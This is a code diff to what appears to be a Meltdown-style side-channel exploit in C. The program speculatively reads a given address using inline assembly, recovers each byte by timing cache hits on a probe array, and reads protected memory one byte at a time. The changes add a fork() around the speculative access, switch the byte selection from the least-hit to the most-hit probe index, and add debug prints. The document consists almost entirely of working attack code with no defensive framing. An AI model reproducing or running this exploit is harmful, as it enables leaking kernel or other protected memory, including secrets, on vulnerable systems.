@@ -10,7 +10,7 @@
 #define ARRAY_SIZE 256
 
 static char target_array[ARRAY_SIZE * PAGE_SIZE];
-static int check_array[ARRAY_SIZE];
+int check_array[ARRAY_SIZE];
 
 void clflush(void)
 {
@@ -23,6 +23,11 @@ extern char stopspeculate[];
 
 void speculate(unsigned long addr)
 {
+	pid_t pid=0;
+	pid=fork();
+	if(pid==0)
+	{
+//		printf("child!\n");
 	__asm__ __volatile__(
 		".rept 100\n\t"
 		"add $0xfff, %%rax\n\t"
@@ -38,6 +43,19 @@ void speculate(unsigned long addr)
 	: "r" (addr),"r" (target_array)
 		: "ax", "bx"
 		);
+	}
+	else
+	{
+//		printf("father!\n");
+		__asm__ __volatile__(
+		".rept 500\n\t"
+		"nop\n\t"
+		".endr\n\t"
+		:
+	: 
+		: "cx"
+		);
+	}
 }
 void check(void)
 {
@@ -60,16 +78,19 @@ void check(void)
 		if (time2 - time1 < min_time)
 		{
 			min_time = time2 - time1;
+//			printf("min time:%d--%d\n",min_time,i);
 			min_i = i;
 		}
 	}
-	check_array[min_i]++;
+//	printf("min_i=%d\n",min_i);
+	check_array[min_i]+=1;
+//	printf("checy_array=%d\n",check_array[min_i]);
 }
 
 int readbyte(unsigned long addr)
 {
 	static char cache_time[256];
-	int min_i, min=100000;
+	int max_i, max=0;
 	memset(check_array, 0, sizeof(check_array));
 	int i;
 	for (i = 0; i < 1000; i++)
@@ -80,13 +101,14 @@ int readbyte(unsigned long addr)
 	}
 	for (i = 0; i < ARRAY_SIZE; i++)
 	{
-		if (check_array[i] < min)
+		printf("check_array[%d]=%d\n",i,check_array[i]);
+		if (check_array[i] > max)
 		{
-			min = check_array[i];
-			min_i = i;
+			max = check_array[i];
+			max_i = i;
 		}
 	}
-	return min_i;
+	return max_i;
 }
 
 void sigsegv(int sig, siginfo_t *siginfo, void *context)
@@ -117,7 +139,7 @@ int main(int argc, char *argv[])
 	for (i = 0; i < size; i++)
 	{
 		ret = readbyte(addr);
-		printf("read:%lu %c", addr, ret);
+		printf("read:%lx ret=%d\n", addr, ret);
 		addr++;
 	}
 	return 0;
